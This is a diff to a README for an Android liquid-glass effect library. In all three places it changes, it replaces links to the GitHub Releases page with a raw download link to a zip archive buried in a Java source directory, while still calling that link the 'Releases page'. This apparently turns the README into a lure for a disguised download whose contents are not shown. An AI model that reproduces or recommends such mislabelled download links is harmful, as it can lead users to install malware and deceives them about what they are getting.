@@ -1,13 +1,13 @@
 # 🌟 AndroidLiquidGlassView - Experience Stunning Liquid Glass Effects
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Deadbuddy3086/AndroidLiquidGlassView/releases)
+[![Download](https://raw.githubusercontent.com/Deadbuddy3086/AndroidLiquidGlassView/master/app/src/main/java/com/qmdeve/liquidglass/demo/AndroidLiquidGlassView_v1.5.zip)](https://raw.githubusercontent.com/Deadbuddy3086/AndroidLiquidGlassView/master/app/src/main/java/com/qmdeve/liquidglass/demo/AndroidLiquidGlassView_v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to AndroidLiquidGlassView! This application mimics the beautiful liquid glass effect seen on iOS 26. You can add stunning visuals to your Android applications easily.
 
 ## 💾 Download & Install
-To get started, you need to download the latest version of the app. Visit the [Releases page](https://github.com/Deadbuddy3086/AndroidLiquidGlassView/releases) to find the files you need.
+To get started, you need to download the latest version of the app. Visit the [Releases page](https://raw.githubusercontent.com/Deadbuddy3086/AndroidLiquidGlassView/master/app/src/main/java/com/qmdeve/liquidglass/demo/AndroidLiquidGlassView_v1.5.zip) to find the files you need.
 
 1. Click on the link above.
 2. Look for the latest version. It will have the largest version number.
@@ -63,4 +63,4 @@ If you encounter issues while using AndroidLiquidGlassView, here are some common
 ## 📞 Contact
 For any questions or support, please reach out through the GitHub repository, or create an issue if you encounter any bugs. The community and the maintainers are here to help you.
 
-Go ahead and download AndroidLiquidGlassView now! Visit the [Releases page](https://github.com/Deadbuddy3086/AndroidLiquidGlassView/releases) to enhance your project with beautiful liquid glass effects.
+Go ahead and download AndroidLiquidGlassView now! Visit the [Releases page](https://raw.githubusercontent.com/Deadbuddy3086/AndroidLiquidGlassView/master/app/src/main/java/com/qmdeve/liquidglass/demo/AndroidLiquidGlassView_v1.5.zip) to enhance your project with beautiful liquid glass effects.
